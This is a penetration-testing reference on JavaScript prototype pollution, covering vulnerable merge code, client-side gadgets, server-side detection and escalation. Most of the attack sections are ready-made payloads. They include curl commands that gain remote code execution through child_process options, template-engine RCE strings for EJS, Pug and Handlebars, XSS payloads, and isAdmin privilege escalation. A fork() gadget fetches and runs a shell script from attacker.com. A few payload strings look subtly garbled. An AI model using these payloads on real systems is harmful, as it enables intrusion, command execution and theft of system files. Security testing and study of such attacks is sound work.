# Prototype Pollution Reference

## 1. Overview

Prototype Pollution is a JavaScript vulnerability where an attacker injects properties into `Object.prototype` (or other built-in prototypes), affecting all objects in the application. It occurs when user input is recursively merged into objects without sanitization.

**Impact ranges from:**
- Client-side: DOM XSS, cookie manipulation, bypass of security checks
- Server-side: RCE (via child_process), privilege escalation, DoS

**Root cause:** Unsafe recursive merge/clone/set operations that follow `__proto__` or `constructor.prototype` paths.

```js
// Vulnerable pattern
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key]; // pollutes if key is __proto__
    }
  }
}
```

---

## 2. Decision Tree (When to Test)

```
Is the target a JS application (Node.js, browser SPA)?
├── YES → Does it accept JSON input or query parameters with nested keys?
│   ├── YES → Does it use recursive merge/deep copy/set operations?
│   │   ├── YES → HIGH PRIORITY — test for PP
│   │   └── UNKNOWN → Test anyway (common in Express middleware)
│   └── NO → Lower priority, but check URL fragment/hash parsing (client-side)
└── NO → Not applicable
```

**Test when you see:**
- Express/Koa/Fastify with body-parser (JSON)
- Libraries: lodash.merge, lodash.set, deepmerge, hoek, jQuery.extend
- Next.js API routes accepting nested JSON
- Query string parsers (qs) with dot/bracket notation
- GraphQL inputs with arbitrary nested objects

---

## 3. Client-Side Prototype Pollution

### Sources (where attacker input enters)

| Source | Example |
|--------|---------|
| URL fragment | `https://target.com/#__proto__[polluted]=1` |
| Query string | `?__proto__[polluted]=1` or `?constructor[prototype][polluted]=1` |
| JSON input | `{"__proto__":{"polluted":"1"}}` |
| postMessage | `window.addEventListener('message', handler)` |
| Web Storage | `localStorage.getItem()` parsed as JSON |

### Detection (Browser Console)

```js
// After injecting via URL or input:
console.log(({}).polluted); // If "1" → pollution confirmed
```

### Common Client-Side Gadgets

**Gadget:** A code path that reads from Object.prototype and performs a dangerous action.

```js
// Example: innerHTML gadget
if (config.innerHTML) {
  element.innerHTML = config.innerHTML; // XSS if innerHTML is polluted
}

// Example: srcdoc gadget
if (options.srcdoc) {
  iframe.srcdoc = options.srcdoc;
}

// Example: script src gadget
if (config.url) {
  script.src = config.url; // loads attacker JS
}
```

### DOM XSS Chain Example

```
1. Pollute: https://target.com/#__proto__[transport_url]=data:,alert(1)//
2. Gadget: library reads obj.transport_url to set script.src
3. Result: XSS execution
```

**Real-world chain (sanitize-html bypass):**
```js
// Pollution
Object.prototype.allowedAttributes = { "*": ["onmouseover"] };
// Now sanitize-html allows event handlers → XSS
```

---

## 4. Server-Side Prototype Pollution

### Safe Detection Techniques

These techniques detect PP without causing DoS or visible side effects.

#### 4.1 Status Code Technique

Pollute a property that changes HTTP response status codes:

```bash
# Pollute "status" — some frameworks read obj.status for response code
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":510}}'

# Then make a normal request and check if status changed
curl -v https://target.com/api/endpoint
# If response is 510 → confirmed
```

#### 4.2 JSON Spaces Technique

Express `json spaces` setting controls JSON indentation:

```bash
# Pollute json spaces
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":"  "}}'

# Check if subsequent JSON responses are now indented
curl https://target.com/api/data
# If response JSON is pretty-printed with 2 spaces → confirmed

# Cleanup: set back to undefined-like value
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":""}}'
```

#### 4.3 Charset Technique (Express/Content-Type)

Pollute `content-type` charset to detect via response headers:

```bash
# Pollute charset
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"charset":"utf-7"}}'

# Check Content-Type header in responses
curl -v https://target.com/api/data
# Look for: Content-Type: application/json; charset=utf-7
```

#### 4.4 Exposed Headers Technique

Pollute properties that add custom headers to responses:

```bash
# Pollute a header via Express options
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"x-]]powered-by":"polluted"}}'

# Or pollute ETag generation
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"etag":true}}'
```

### RCE via child_process

When `child_process.spawn/exec/fork` is called, polluted env/shell options enable RCE:

```bash
# Pollute shell and env to get RCE when any child_process is spawned
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__":{
      "shell":"/proc/self/exe",
      "argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())",
      "NODE_OPTIONS":"--require /proc/self/cmdline"
    }
  }'
```

**Alternative — env-based RCE (Node.js):**

```bash
# Works when child_process.spawn is called without explicit env
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__":{
      "shell":"node",
      "NODE_OPTIONS":"--require /proc/self/cmdline",
      "argv0":"console.log(require(\"child_process\").execSync(\"cat /etc/passwd\").toString())//"
    }
  }'
```

**fork() gadget:**

```bash
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__":{
      "execPath":"node",
      "execArgv":["-e","require(\"child_process\").execSync(\"curl attacker.com/shell.sh|bash\")"]
    }
  }'
```

### Privilege Escalation

```bash
# Pollute isAdmin or role properties
curl -X POST https://target.com/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true,"role":"admin"}}'

# If authorization checks do: if (user.isAdmin) → bypassed
# Because user object inherits polluted isAdmin from prototype
```

```js
// Vulnerable authorization pattern:
function isAuthorized(user) {
  return user.role === 'admin'; // reads from prototype if not set on user
}
```

---

## 5. Detection Payloads

### `__proto__` Vector

```json
{"__proto__":{"polluted":"yes"}}
```

```bash
# Query string
?__proto__[polluted]=yes
?__proto__.polluted=yes

# Nested
{"a":{"__proto__":{"polluted":"yes"}}}
```

### `constructor.prototype` Vector

```json
{"constructor":{"prototype":{"polluted":"yes"}}}
```

```bash
# Query string
?constructor[prototype][polluted]=yes
?constructor.prototype.polluted=yes
```

### Bypass Variants (when `__proto__` is filtered)

```json
{"constructor":{"prototype":{"polluted":"yes"}}}
```

```js
// Unicode bypass attempts
{"__pro\u0074o__":{"polluted":"yes"}}

// Nested path traversal
{"a":"b","__proto__":{"polluted":"yes"}}
```

### Verification Payloads

```js
// Client-side verification
Object.prototype.hasOwnProperty('polluted') // false — it's on prototype
({}).polluted === 'yes' // true — confirmed

// Server-side verification (blind)
// Use the safe detection techniques from Section 4
```

---

## 6. Common Gadgets

### Lodash (< 4.17.12)

```js
// lodash.merge
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log(({}).polluted); // "yes"

// lodash.set
_.set({}, '__proto__.polluted', 'yes');

// lodash.setWith
_.setWith({}, '__proto__.polluted', 'yes');
```

### jQuery (< 3.4.0)

```js
// jQuery.extend deep merge
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));

// Exploitation via $.extend gadget
$.extend(true, {}, '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}');
```

### Handlebars (< 4.6.0)

```js
// Handlebars template compilation RCE
// Pollute to inject template helpers
Object.prototype.main = '\n}}\n{{#each constructor.constructor}}{{/each}}\n{{#with (lookup constructor "assign")}}{{#with (call this (lookup ../constructor "keys") "__proto__")}}{{/with}}{{/with}}\nprocess.mainModule.require("child_process").execSync("id")//';

// Or via allowProtoPropertiesByDefault
Object.prototype.allowProtoPropertiesByDefault = true;
```

### Pug (Jade) — Template RCE

```js
// Pollute block to inject code during compilation
Object.prototype.block = {
  "type": "Text",
  "val": "x]]\nprocess.mainModule.require('child_process').execSync('id')"
};

// Alternative: pollute self_closing for Pug
Object.prototype.self_closing = ["img`; process.mainModule.require('child_process').execSync('id'); //"];
```

### EJS — Template RCE

```js
// EJS reads options from object properties
Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');x";

// Or via client option
Object.prototype.client = true;
Object.prototype.escapeFunction = "1;process.mainModule.require('child_process').execSync('id');//";
```

```bash
# EJS RCE via PP (curl)
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# Then trigger any EJS render
curl https://target.com/page-that-renders-ejs
```

---

## 7. Tools

### ppmap (Client-Side Scanner)

```bash
# Install
git clone https://github.com/nicolo-ribaudo/ppmap
# OR
npm install -g ppmap

# Usage — scans for client-side PP via known gadgets
ppmap https://target.com

# Checks URL fragment and query string vectors
# Reports exploitable gadgets found in loaded scripts
```

### Burp Suite Scanner

- **Burp Pro** automatically detects server-side PP via the "JSON spaces" and status code techniques
- Extension: **Server-Side Prototype Pollution Scanner**
  - Install from BApp Store
  - Passive + Active scanning
  - Uses non-destructive detection methods

**Manual Burp testing:**
1. Send JSON request to Repeater
2. Add `"__proto__":{"json spaces":"  "}` to body
3. Send subsequent request and check for indented JSON response

### Nuclei Templates

```bash
# Run PP-specific templates
nuclei -u https://target.com -t nuclei-templates/http/vulnerabilities/prototype-pollution/

# Specific template
nuclei -u https://target.com -t prototype-pollution-check.yaml

# Custom template example
echo 'id: pp-detect
info:
  name: Prototype Pollution Detection
  severity: high
requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/settings"
    headers:
      Content-Type: application/json
    body: |
      {"__proto__":{"json spaces":"  "}}
    matchers:
      - type: regex
        part: body
        regex:
          - "^\\s{2}" ' > pp-custom.yaml

nuclei -u https://target.com -t pp-custom.yaml
```

### Additional Tools

- **cdnjs + Retire.js** — identify vulnerable library versions
- **DOM Invader (Burp)** — browser-based client-side PP detection
- **ppfind** — static analysis for Node.js merge patterns
- **ESLint plugin** — `eslint-plugin-security` flags unsafe merges

---

## 8. Pitfalls

### DoS Risk

**Critical:** Polluting `Object.prototype` on a server affects ALL requests for ALL users until the process restarts.

```js
// DANGEROUS — causes DoS:
Object.prototype.toString = "polluted"; // breaks everything
Object.prototype.valueOf = "polluted";  // breaks arithmetic
Object.prototype.length = 0;           // breaks iterations
```

**Safe properties to pollute for detection:**
- `json spaces` (Express-specific, cosmetic only)
- Custom property names unlikely to collide (e.g., `__pp_test_<random>`)
- `status` (only if you immediately verify and the app handles it)

**Rules:**
1. Never pollute `toString`, `valueOf`, `hasOwnProperty`, `constructor`, `length`
2. Always use unique property names for blind detection
3. Test in off-hours or on staging when possible
4. Have a plan to restart the service if needed

### Cleanup

**There is no reliable way to clean up server-side PP without restarting the process.**

```js
// This does NOT work reliably:
delete Object.prototype.polluted; // only works if you know the exact key

// Partial cleanup attempt:
delete Object.prototype['json spaces'];
```

**Best practices:**
- Use detection-only payloads first (json spaces, status code)
- Document what you polluted for the report
- Coordinate with the target team for process restart if needed
- On client-side: refresh the page to reset

### Other Pitfalls

- **WAF bypass needed:** Some WAFs block `__proto__` — use `constructor.prototype` instead
- **Content-Type matters:** Must be `application/json` for JSON body parsing
- **Nested merges only:** Flat `Object.assign()` is NOT vulnerable (only copies own enumerable properties)
- **Framework differences:** Express 4.x vs 5.x handle prototype differently
- **Rate limiting:** Multiple detection attempts may trigger rate limits

---

## 9. Checklist

- [ ] **1. Identify merge points** — Find all endpoints accepting nested JSON objects (POST/PUT/PATCH with body-parser)
- [ ] **2. Test `__proto__` vector** — Send `{"__proto__":{"json spaces":"  "}}` and check if subsequent responses are indented
- [ ] **3. Test `constructor.prototype` vector** — Send `{"constructor":{"prototype":{"json spaces":"  "}}}` as WAF bypass
- [ ] **4. Confirm with safe detection** — Use status code, charset, or exposed headers technique to verify without side effects
- [ ] **5. Identify exploitable gadgets** — Check for child_process usage, template engines (EJS/Pug/Handlebars), or authorization checks reading from prototype
- [ ] **6. Attempt escalation** — Try RCE via child_process pollution, privilege escalation via isAdmin/role, or XSS via template gadgets
- [ ] **7. Check client-side** — Test URL hash/query vectors, run ppmap/DOM Invader, identify JS libraries with known gadgets
- [ ] **8. Document and clean up** — Record all polluted properties, coordinate process restart if server-side, note DoS risk in report

---

## Quick Reference Card

```bash
# Server-side detection (safe)
curl -X POST $TARGET/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":"  "}}'
curl -s $TARGET/api/endpoint | head -5  # check indentation

# Client-side detection
# Navigate to: https://target.com/page#__proto__[testprop]=testval
# Console: ({}).testprop === 'testval'

# RCE attempt (EJS)
curl -X POST $TARGET/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# Privilege escalation
curl -X POST $TARGET/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true,"role":"admin"}}'
```
